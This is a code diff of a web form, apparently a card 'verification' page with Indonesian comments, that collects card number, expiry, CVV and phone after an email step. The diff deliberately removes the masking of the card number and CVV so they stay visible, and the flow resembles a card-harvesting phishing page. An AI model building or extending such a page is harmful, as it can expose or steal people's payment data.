@@ -83,7 +83,7 @@
         <label>Country/Region</label>
         <select id="negara">
             <option value="GB">United Kingdom</option>
-            <option value="ID">Indonesia</option>
+            <option value="ID" selected>Indonesia</option>
             <option value="JP">Japan</option>
             <option value="US">United States</option>
             <option value="AU">Australia</option>
@@ -107,7 +107,7 @@
         <label>Phone Number</label>
         <div class="tel">
             <span id="kodeTel">+44</span>
-            <input type="tel" id="telepon" placeholder="7xxx xxxxxx">
+            <input type="tel" id="telepon" placeholder="8xx xxxxxxxx">
         </div>
 
         <button id="tombol" disabled onclick="lanjut()">Verify & Continue</button>
@@ -126,10 +126,8 @@
             if (!email) { window.location.href = 'index.html'; return; }
         });
 
-        // === CEK JENIS KARTU & TAMPILKAN LOGO ===
         function cekJenisKartu() {
-            const val = document.getElementById('nomor').value.replace(/\s/g, '');
-            nomorAsli = val;
+            const val = nomorAsli;
             const ikon = document.getElementById('ikonKartu');
             document.querySelectorAll('.logo-kartu img').forEach(i => i.classList.remove('aktif'));
 
@@ -145,40 +143,29 @@
             cekLengkap();
         }
 
-        // === FORMAT NOMOR KARTU — TETAP TERLIHAT SAAT DIKETIK ===
-        document.getElementById('nomor').addEventListener('input', function() {
-            let angka = this.value.replace(/\D/g, '');
-            nomorAsli = angka;
-            
-            // Tampilkan angka + spasi, TIDAK disembunyikan saat mengetik
+        // === SELALU TAMPILKAN ANGKA — TIDAK DIUBAH JADI TITIK ===
+        function formatNomor(angka) {
             let tampil = '';
             for (let i = 0; i < angka.length; i++) {
                 if (i > 0 && i % 4 === 0) tampil += ' ';
                 tampil += angka[i];
             }
-            this.value = tampil;
+            return tampil;
+        }
+
+        document.getElementById('nomor').addEventListener('input', function() {
+            let angka = this.value.replace(/\D/g, '');
+            nomorAsli = angka;
+            this.value = formatNomor(angka);
             cekJenisKartu();
         });
 
-        // Saat fokus: tampilkan angka asli
+        // ❌ Hapus perubahan jadi titik saat blur — biarkan angka tetap terlihat
         document.getElementById('nomor').addEventListener('focus', function() {
-            let tampil = '';
-            for (let i = 0; i < nomorAsli.length; i++) {
-                if (i > 0 && i % 4 === 0) tampil += ' ';
-                tampil += nomorAsli[i];
-            }
-            this.value = tampil;
+            this.value = formatNomor(nomorAsli);
         });
-
-        // Saat hilang fokus: ubah jadi titik
         document.getElementById('nomor').addEventListener('blur', function() {
-            if (nomorAsli.length === 0) return;
-            let tampil = '';
-            for (let i = 0; i < nomorAsli.length; i++) {
-                if (i > 0 && i % 4 === 0) tampil += ' ';
-                tampil += '•';
-            }
-            this.value = tampil;
+            this.value = formatNomor(nomorAsli); // Tetap tampilkan angka, bukan titik
         });
 
         // === EXPIRY DATE ===
@@ -198,10 +185,9 @@
         document.getElementById('cvv').addEventListener('focus', function() {
             this.value = cvvAsli;
         });
+        // ❌ CVV juga tetap angka saat pindah kolom
         document.getElementById('cvv').addEventListener('blur', function() {
-            if (cvvAsli.length > 0) {
-                this.value = cvvAsli.replace(/./g, '•');
-            }
+            this.value = cvvAsli; // Tetap tampilkan angka
         });
 
         // === CEK SEMUA DATA LENGKAP ===
